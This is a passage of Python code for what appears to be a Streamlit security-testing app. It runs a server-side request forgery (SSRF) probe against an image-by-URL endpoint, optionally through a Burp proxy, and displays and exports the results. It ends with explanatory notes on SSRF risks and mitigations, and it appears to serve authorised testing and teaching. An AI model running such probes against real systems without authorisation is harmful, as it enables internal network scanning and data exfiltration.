        burp_url = burp if (use_burp_ssrf and burp) else ("http://127.0.0.1:8080" if use_burp_ssrf else None)
        with st.spinner("Executing SSRF probe against endpoint..."):
            report = run_ssrf_probe(
                base_ssrf,
                burp_url,
                float(timeout_ssrf),
                endpoint_path.strip() or "/profile/image-url",
                method,
                template_json,
                targets,
            )

        st.success("SSRF probe complete.")
        st.markdown("**Summary**")
        st.json({"marker": report["marker"], "endpoint": report["endpoint"], "method": report["method"], "verdicts": report.get("verdicts", [])})

        st.markdown("**Steps**")
        for i, step in enumerate(report["steps"], 1):
            with st.expander(f"{i}. Fetch {step['url_to_fetch']} → status {step['status']} ({step['length']} bytes)"):
                st.json(step)

        st.download_button(
            "💾 Download SSRF Report (JSON)",
            data=json.dumps(report, indent=2),
            file_name=f"ssrf_report_{report['marker']}.json",
            mime="application/json",
            use_container_width=True,
        )

    st.markdown("---")
    st.markdown("**How to explain SSRF in your demo/report**")
    st.markdown("""
- **What we did:** We gave the backend an external URL to fetch (via a feature like “image by URL”). If the server performs the fetch,
  the attacker controls where the server connects — this is **Server-Side Request Forgery**.
- **Why it matters:** The server often sits on a trusted network and can access **internal-only** services (DB admin UIs, cloud metadata, Redis, etc.).
  If the app returns that content or behaves differently based on the response, attackers can **exfiltrate** or **scan internal networks**.
- **What to look for in results:** 2xx status with non-trivial length or echoed content is a strong signal. Even errors can leak timing and reachability.
- **Mitigations:** Allow-list schemes and hosts, block link-local/loopback/private ranges, perform server-side HEAD/GET with strict filters,
  use SSRF-aware libraries/proxies, and monitor outbound egress.
""")
